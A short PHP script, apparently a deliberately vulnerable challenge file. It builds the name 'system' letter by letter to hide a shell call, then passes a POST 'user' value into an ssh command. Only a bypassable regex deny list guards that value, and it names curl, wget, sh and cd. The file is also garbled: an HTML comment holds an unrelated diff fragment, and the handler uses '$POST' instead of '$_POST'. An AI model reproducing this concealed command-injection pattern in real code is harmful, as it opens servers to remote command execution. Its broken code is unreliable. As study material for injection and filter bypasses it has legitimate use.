<?php

function overview($user) {
    $e = 'e';
    $m = 'm';
    $t = 't';
    $s = 's';
    $y = 'y';

    $play = $s . $y . $s . $t . $e . $m; # system

    $disallowedPatterns = [
        '/(\.\.)/',                 // Disallow double dots ".." (directory traversal)
        '/\s+(cd|sh|curl|wget)\s+/',// Disallow the commands 'cd', 'sh', 'curl', 'wget' with any leading or trailing whitespace
        '/\//',                     // Disallow forward slashes "/"
        '/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/', // Disallow IP addresses
        '/\s+/',                    // Disallow any whitespace
        '/%20/'                     // Disallow URL-encoded spaces "%20"
    ];

    foreach ($disallowedPatterns as $pattern) {
        if (preg_match($pattern, $user)) {
            return "";
        }
    }

    $play('ssh ' . $user . '@127.0.0.1');
    system('ssh user@127.0.0.1');
}

?>
<!-- 
+if (isset($_POST["user"])) {$man = $_POST["user"];$overview($man);}
 # UPDATE "Staff data" from dashboard.php -> PANE STAFF
 	if (isset($_POST['satff_save']) || isset($_POST['staff_save_exit'])) {
 		$fname = mysqli_real_escape_string($conn, $_POST['f_name']); -->

<?php

if (isset($_POST["user"])) {
    $man = $POST["user"];
    overview($man);
}

?>
